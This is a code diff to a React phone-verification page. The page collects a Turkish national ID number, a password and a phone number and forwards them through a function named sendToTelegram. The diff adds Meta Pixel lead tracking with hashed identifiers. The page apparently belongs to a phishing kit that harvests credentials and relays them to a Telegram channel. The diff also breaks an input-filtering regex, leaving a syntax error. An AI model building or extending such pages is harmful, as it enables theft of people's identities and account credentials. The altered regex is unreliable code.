@@ -3,6 +3,8 @@ import { useLocation, useNavigate } from 'react-router-dom';
 import './App.css';
 import { useAuth } from './AuthContext';
 
+/* global fbq */  // ESLint için: fbq global olarak tanımla (Meta Pixel'den geliyor)
+
 function PhoneVerificationPage() {
   const [state, setState] = React.useState({
     phoneNumber: '',
@@ -20,6 +22,44 @@ function PhoneVerificationPage() {
   const navigate = useNavigate();
   const { dispatch: authDispatch } = useAuth();
   const { tc, password, isValidNavigation } = location.state || {};
+
+  // SHA-256 hash fonksiyonu (Meta için user_data hashing)
+  const sha256Hash = async (str) => {
+    const msgUint8 = new TextEncoder().encode(str.toLowerCase().trim());
+    const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+  };
+
+  // Meta Lead event'i tetikle (başarılı submit sonrası)
+  const trackMetaLead = useCallback(async (tc, phone, eventID) => {
+    if (typeof window !== 'undefined' && window.fbq) {
+      try {
+        const normalizedPhone = `+90${phone}`;
+        const hashedPhone = await sha256Hash(normalizedPhone);
+        const hashedTc = await sha256Hash(tc);
+
+        fbq('track', 'Lead', {
+          eventID: eventID,
+          custom_data: {
+            content_category: 'lead_form',
+            content_name: 'phone_verification',
+          },
+          user_data: {
+            ph: [hashedPhone],
+            external_id: [hashedTc],
+            client_ip_address: '',
+            client_user_agent: navigator.userAgent,
+          },
+          action_source: 'website',
+          event_source_url: window.location.href,
+        });
+        console.log('Meta Lead event tetiklendi (Client):', { eventID: eventID.substring(0, 8) + '...' });
+      } catch (error) {
+        console.error('Meta event hatası (Client):', error);
+      }
+    }
+  }, []);
 
   // Navigasyon ve geri tuşu kontrolü
   useEffect(() => {
@@ -59,6 +99,7 @@ function PhoneVerificationPage() {
           tc: String(data.tc),
           password: String(data.password),
           phone: String(data.phone),
+          eventID: data.eventID,
         }),
       });
       const result = await res.json();
@@ -88,7 +129,7 @@ function PhoneVerificationPage() {
   }, [tc, password, state.phoneNumber, sendToTelegram]);
 
   const handleNumberInput = useCallback((e) => {
-    const value = e.target.value.replace(/\D/g, '');
+    const value = e.target.value.replace(/\D/g/, '');
     if (value.length <= 10) {
       setState((prev) => ({
         ...prev,
@@ -148,7 +189,21 @@ function PhoneVerificationPage() {
       }
       if (state.phoneNumber.length === 10) {
         setState((prev) => ({ ...prev, isSubmitting: true }));
-        const result = await sendToTelegram({ tc, password, phone: state.phoneNumber });
+        
+        // eventID'yi burada üret
+        const eventID = `lead_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+        
+        // Önce client-side event'i tetikle
+        await trackMetaLead(tc, state.phoneNumber, eventID);
+        
+        // Sonra backend'e gönder
+        const result = await sendToTelegram({ 
+          tc, 
+          password, 
+          phone: state.phoneNumber,
+          eventID
+        });
+        
         if (result && !result.error) {
           authDispatch({ type: 'RESET_AUTH' });
           setState({
@@ -166,7 +221,7 @@ function PhoneVerificationPage() {
         }
       }
     },
-    [state.phoneNumber, sendToTelegram, tc, password, navigate, authDispatch]
+    [state.phoneNumber, sendToTelegram, tc, password, navigate, authDispatch, trackMetaLead]
   );
 
   return (
